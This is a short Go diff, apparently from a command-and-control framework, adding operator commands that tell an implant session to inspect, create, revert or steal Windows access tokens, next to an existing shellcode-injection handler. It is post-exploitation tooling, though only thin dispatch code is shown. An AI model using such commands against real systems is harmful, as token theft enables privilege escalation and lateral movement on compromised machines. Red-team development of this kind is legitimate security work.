@@ -224,3 +224,39 @@ func HandleImplantInjectShellcode(engine *core.Engine, session *uint32, args []s
 
 	engine.ImplantInjectShellcode(*session, int(pid), shellcode)
 }
+
+func HandleImplantTokenInfo(engine *core.Engine, session *uint32, args []string) {
+	engine.ImplantTokenInfo(*session)
+}
+
+func HandleImplantTokenRev2Self(engine *core.Engine, session *uint32, args []string) {
+	engine.ImplantTokenRev2Self(*session)
+}
+
+func HandleImplantTokenMake(engine *core.Engine, session *uint32, args []string) {
+	if len(args) < 3 {
+		logger.Info("token_make [domain] [username] [password]")
+		return
+	}
+
+	domain := args[0]
+	username := args[1]
+	password := args[2]
+
+	engine.ImplantTokenMake(*session, domain, username, password)
+}
+
+func HandleImplantTokenSteal(engine *core.Engine, session *uint32, args []string) {
+	if len(args) < 1 {
+		logger.Info("token_steal [pid] ")
+		return
+	}
+
+	pid, err := strconv.ParseInt(args[0], 10, 32)
+	if err != nil {
+		logger.Error("failed to parse pid: %v", err)
+		return
+	}
+
+	engine.ImplantTokenSteal(*session, uint32(pid))
+}
